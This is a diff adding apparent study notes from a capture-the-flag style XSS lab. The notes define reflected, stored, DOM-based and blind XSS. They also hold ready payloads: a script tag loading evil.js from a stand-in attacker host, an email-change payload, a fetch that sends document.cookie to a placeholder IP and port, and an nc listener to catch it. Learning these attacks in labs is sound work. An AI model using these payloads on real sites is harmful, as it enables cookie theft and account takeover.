@@ -112,8 +112,28 @@ Key Logger
 Business Logic
 <script>user.changeEmail('attacker@hacker.thm');</script>
 
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
+
+Reflected XSS
+https://website.com/?error=<script src="https://attacher.thm/evil.js"></script>
+
+Stored XSS
+XSS payload is stored on the web application (in a database, for example)
+
+
+DOM Based XSS
+Document Object Model and is a programming interface for HTML and XML documents
+Eg. window.location.hash, window.location.x
+
+Blind XSS
+Blind XSS is similar to a stored XSS (which we covered in task 4)
+https://github.com/mandatoryprogrammer/xsshunter-express
+
+</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
+nc -nlvp 9001
+
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
 
 
